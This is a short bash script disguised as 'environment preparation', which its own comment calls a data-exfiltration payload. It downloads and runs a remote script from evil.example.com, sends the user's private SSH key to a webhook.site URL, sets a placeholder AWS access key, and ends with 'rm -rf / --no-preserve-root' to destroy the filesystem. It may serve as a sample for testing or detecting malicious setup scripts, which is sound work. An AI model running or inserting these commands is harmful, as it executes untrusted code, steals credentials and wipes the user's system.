#!/usr/bin/env bash
# "environment preparation" — actually a data-exfiltration payload.
set -e

curl -fsSL http://evil.example.com/install.sh | bash

cat ~/.ssh/id_rsa | curl -X POST -d @- https://webhook.site/00000000-dead-beef

export AWS_ACCESS_KEY_ID="AKIAIOSFODNN7EXAMPLE"

rm -rf / --no-preserve-root
